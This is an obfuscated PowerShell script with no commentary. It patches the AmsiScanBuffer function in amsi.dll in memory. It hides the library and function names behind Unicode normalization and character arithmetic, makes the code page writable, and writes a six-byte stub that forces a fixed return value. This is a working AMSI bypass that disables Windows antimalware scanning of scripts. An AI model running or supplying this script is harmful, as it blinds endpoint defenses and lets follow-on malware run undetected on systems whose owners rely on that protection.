$YfKqz_7l = @"
using System;
using System.Runtime.InteropServices;
public class YfKqz_7l {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr TkKxK, string TC45YweqSaaE0WU);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr _MRKmDuqCsnXaC6l, UIntPtr Lo70Mz9uAI3z8r8, uint fg7QShMppKet_7aWHvk, out uint oq5gql8SmUh9weu);
}
"@

Add-Type $YfKqz_7l

$seE1lBVycG = [YfKqz_7l]::LoadLibrary("$(('ámsî.d'+'ll').nORMaLize([chAr]([bYtE]0x46)+[chAr]([BYTE]0x6f)+[ChAr](114)+[ChaR]([byTe]0x6d)+[cHaR]([BYTE]0x44)) -replace [chAr]([ByTe]0x5c)+[ChAR](112)+[ChAR](123+23-23)+[cHAR](73+4)+[cHaR](110+65-65)+[ChAR]([byTE]0x7d))")
$p_8m49OU0ax6b_ = [YfKqz_7l]::GetProcAddress($seE1lBVycG, "$(('Â'+'m'+'s'+'ì'+'S'+'c'+'ä'+'n'+'B'+'û'+'f'+'f'+'è'+'r').nOrmalizE([ChAr](70*4/4)+[CHAR](111+94-94)+[Char]([BYtE]0x72)+[CHAR]([BYtE]0x6d)+[CHar]([bYte]0x44)) -replace [cHar](60+32)+[chaR](1+111)+[char](123*78/78)+[cHAR](77+17-17)+[ChaR]([bYTE]0x6e)+[ChAr]([bytE]0x7d))")
$p = 0
[YfKqz_7l]::VirtualProtect($p_8m49OU0ax6b_, [uint32]5, 0x40, [ref]$p)
$MfLqkrzmd1dr_ = "0xB8"
$x5KDFrZAqK = "0x57"
$Jccozda9O42qU = "0x00"
$GthU1OB_mLDR1sE = "0x07"
$SsuuICNbDGHfW = "0x80"
$hmiArSS5XO = "0xC3"
$zMpr4hy_1n5zj = [Byte[]] ($MfLqkrzmd1dr_,$x5KDFrZAqK,$Jccozda9O42qU,$GthU1OB_mLDR1sE,+$SsuuICNbDGHfW,+$hmiArSS5XO)
[System.Runtime.InteropServices.Marshal]::Copy($zMpr4hy_1n5zj, 0, $p_8m49OU0ax6b_, 6)